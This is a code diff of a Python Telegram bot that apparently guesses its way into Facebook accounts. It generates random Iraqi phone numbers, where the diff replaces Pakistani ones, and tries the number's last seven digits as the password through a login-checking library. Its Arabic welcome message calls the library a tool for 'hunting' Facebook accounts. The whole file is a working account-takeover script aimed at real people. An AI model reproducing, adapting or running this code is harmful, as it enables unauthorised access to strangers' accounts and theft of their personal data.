@@ -1,6 +1,7 @@
 import os
 os.system('pip install FBlevi')
 os.system('pip install pyotp')
+os.system('pip install mechanize')
 try:
 	from time import sleep
 	import telebot
@@ -16,9 +17,9 @@ bot = telebot.TeleBot(tokeen)
 @bot.message_handler(commands=['start'])
 def Welcome(message):
 	bot.reply_to(message,'''
-⌯تم صناعه هذا البوت بواسطله مكتبه الحديده لصيد الفيس وانصح الكل بها 
-⌯ مطور : @Q_2_M''',reply_markup=telebot.types.InlineKeyboardMarkup([
-        [telebot.types.InlineKeyboardButton(text='بدأ', callback_data='start')]
+⌯ تم تطوير هذا البوت من قبل المطور TAKEMICHI
+⌯ @Q_2_M''',reply_markup=telebot.types.InlineKeyboardMarkup([
+        [telebot.types.InlineKeyboardButton(text='بدأ الفحص', callback_data='start')]
     ]))    
 @bot.callback_query_handler(lambda call: call.data == "start")  
 def TamTa(call):
@@ -26,9 +27,10 @@ def TamTa(call):
     vm=0
     while True:
         vm+=1
+        phn = ['78', '77', '75']
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
-       
-        user = '92305'+nmp
+	codo = str(''.join(random.choice(phn)for i in range(1)))
+        user = '+964'+codo+nmp
         ps= nmp
         FB = Start(phone=user, password=ps)
         if FB.IsValid:
